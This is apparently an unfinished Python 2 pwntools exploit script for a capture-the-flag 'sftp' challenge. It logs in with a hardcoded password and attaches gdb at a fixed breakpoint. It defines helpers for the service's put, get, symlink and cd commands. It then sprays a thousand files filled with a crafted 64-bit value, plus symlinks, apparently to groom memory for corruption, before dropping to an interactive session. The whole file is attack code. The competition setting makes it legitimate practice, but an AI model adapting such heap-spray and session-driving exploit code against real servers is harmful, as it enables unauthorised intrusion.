#!/usr/bin/env python2
from pwn import * # pip install --upgrade pwntools

HOST = 'sftp.ctfcompetition.com'
PORT = 1337

elf = ELF('sftp')
#r = remote(HOST, PORT)
r = process('./sftp')

context.terminal = ['urxvt', '-e', 'sh', '-c']
gdb.attach(r, """
b *0x555555556196
c
""")
##""".format(hex(elf.symbols['main'])))

r.sendline('yes')
r.sendline('pZBbdBEnmlVHvWk')

print('+++Logged in+++')

def put(filename, data):
    r.sendline("put {}".format(filename))
    r.sendline(str(len(data)))
    r.send(data)
    r.recvuntil("sftp> ")

def file(cmd, filename):
    r.sendline("{} {}".format(cmd, filename))
    return r.recvuntil("sftp> ")

def get(filename):
    r.sendline("get {}".format(filename))
    r.recvline()
    return r.recvuntil("sftp> ").split("sftp> ")[0]

def rm(filename):
    return file("rm", filename)

def rmdir(dirname):
    return file("rmdir", dirname)

def mkdir(dirname):
    return file("mkdir", dirname)

def symlink(orig, new):
    r.sendline("symlink {} {}".format(orig, new))
    return r.recvuntil("sftp> ")

def cd(path):
    r.sendline("cd {}".format(path))
    return r.recvuntil("sftp> ")

pause()

#n = 813
#n = 1000
#filename = "BBBBBBBB"
#mkdir(filename)
#for i in xrange(0, n):
    #mkdir(filename)
    #symlink("AAAA", "AAAA/AAAA/..")
    #cd(filename)
    #print(i)

#for i in xrange(0, n):
    #cd("..")

print("NEXT!")

n = 1000
for i in xrange(0, n):
    filename = "a" + str(i)
    put(filename, p64(0x1999999999999991)*(5000/8))
    symlink(filename, "c" + str(i))
    #put(filename, "a"*1)
    #print(filename)


#put("AAAA", "A"*65535)

r.interactive()
